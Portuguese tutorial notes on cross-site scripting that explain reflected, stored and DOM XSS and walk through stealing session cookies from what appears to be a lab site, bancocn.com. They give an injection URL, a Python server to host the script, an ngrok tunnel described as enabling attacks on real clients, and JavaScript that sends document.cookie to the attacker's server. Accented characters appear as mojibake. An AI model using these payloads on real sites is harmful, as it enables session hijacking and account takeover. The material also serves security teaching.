# Cross-Site Scripting (XSS) - Atacando o Cliente üíÄ


## Reflected XSS ü™û

Quando o conte√∫do do parametro da url est√° sendo refletido no HTML da p√°gina de forma insegura, sem tratamentos, chamamos de Reflected XSS.
Podemos encontrar outros m√©todos de XSS, como:

- storage XSS: Ou XSS persistente √© quando a aplica√ß√£o guarda o conte√∫do malicioso dentro do banco de dados e sempre mostra o mesmo em alguma p√°gina;
- XSS DOM: Quando o JavaScript da pr√≥pria aplica√ß√£o trata de forma insegura alguma entrada/parametro da url;


## Capturando Cookies üç™
Podemos utilizar o XSS para sequestrar os cookies do client para conseguirmos realizar login sem mesmo precisar das credenciais.

O m√©todo abaixo pode nos resultar nos cookies do cliente ou n√£o, dependendo se a flag `HttpOnly` estiver ativada ou n√£o:

    http://www.bancocn.com/cat.php?id=2'<script>alert(document.cookie)</script>

#### Verificando Pol√≠ticas do Site

Podemos verificar se atrav√©s das Headers que o site envia, ele est√° ou n√£o sujeito a receber scripts externos atrav√©s da
[OWASP](https://www.owasp.org/www-project-secure-headers/#content-security-policy)

O Header `Content-Security-Policy` dita algumas regras na aplica√ß√£o, como se ela pode executar scripts externos vindos de outros sites ou scripts diretamente do HTML por exemplo.

<br/>

Criando o servidor que ir√° conter o script malicioso:
```python
python3 -m http.server
```

Podemos tamb√©m, utilizar o [ngrok](https://www.ngrok.com) para criarmos um t√∫nel de acesso ao nosso servidor para o p√∫blico, assim possibilitando o ataque em clients reais.

Criando o script malicioso:
```javascript
// criando uma imagem na tela que ir√° gerar uma requisi√ß√£o JS.
new Image().src = "<url do servidor>/?" + document.cookie
// redirecionar o client para a ra√≠z do site e n√£o mostrar o erro de SQL.
window.location = "/"
```

Assim podemos chamar nosso servidor e o script diretamente pelo navegador:

    http://www.bancocn.com/cat.php?id=2'<script src="<url do nosso servidor>/script.js"></script>
